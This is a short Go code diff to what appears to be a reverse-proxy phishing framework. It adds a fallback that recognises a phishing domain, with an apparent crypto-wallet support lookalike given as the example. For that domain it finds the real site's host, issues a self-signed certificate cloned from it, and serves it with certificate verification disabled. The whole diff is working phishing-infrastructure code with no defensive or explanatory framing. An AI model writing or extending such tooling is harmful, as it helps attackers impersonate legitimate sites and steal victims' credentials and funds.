@@ -1573,8 +1573,22 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			if !p.cfg.IsLureHostnameValid(hostname) {
 				phish_host, ok = p.replaceHostWithPhished(hostname)
 				if !ok {
-					log.Debug("phishing hostname not found: %s", hostname)
-					return nil, fmt.Errorf("phishing hostname not found")
+					// hostname is a phishing host (e.g. www.walletsupport.live)
+					// find the real host to clone cert from
+					real_host, ok2 := p.replaceHostWithOriginal(hostname)
+					if !ok2 {
+						log.Debug("phishing hostname not found: %s", hostname)
+						return nil, fmt.Errorf("phishing hostname not found")
+					}
+					cert, err := p.crt_db.getSelfSignedCertificate(real_host, hostname, port)
+					if err != nil {
+						log.Error("http_proxy: %s", err)
+						return nil, err
+					}
+					return &tls.Config{
+						InsecureSkipVerify: true,
+						Certificates:       []tls.Certificate{*cert},
+					}, nil
 				}
 			}
 
